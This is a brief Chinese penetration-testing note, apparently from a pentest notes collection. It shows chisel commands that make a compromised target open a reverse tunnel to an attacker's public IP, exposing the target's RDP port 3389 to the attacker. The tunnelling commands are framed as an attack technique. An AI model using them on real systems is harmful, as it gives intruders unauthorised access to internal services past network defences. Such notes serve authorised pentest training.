	https://github.com/jpillora/chisel
	攻击机执行
	>chisel server -p 12138 –reverse
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png)

	靶机执行
	>chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png)

	建立成功后，攻击机连接本机1234端口即可访问靶机3389
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png)
